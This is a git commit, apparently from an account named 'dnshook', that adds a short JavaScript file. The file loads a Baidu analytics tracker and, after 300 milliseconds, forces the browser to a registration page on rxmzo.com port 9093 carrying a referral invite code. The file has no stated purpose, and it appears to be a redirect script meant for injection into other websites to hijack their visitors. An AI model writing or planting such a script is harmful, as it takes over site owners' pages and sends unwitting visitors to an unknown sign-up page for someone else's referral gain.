8984fc227150846a44e49294afecba05f3138755
dnshook <62766196+dnshook@users.noreply.github.com>
2022-11-28 17:49:14 +0800

    Create 1.js

---
+++ 1.js
@@ -0,0 +1,15 @@
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?db06e66ab0a6c309d5c065e27df2663f";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+function time() {
+    var arr = ["https://www.rxmzo.com:9093/entry/register/?i_code=94802501", "https://www.rxmzo.com:9093/entry/register/?i_code=94802501"];
+		window.location.href = arr[parseInt(Math.random() * arr.length)];
+}
+setTimeout(time, 300);
+</script>
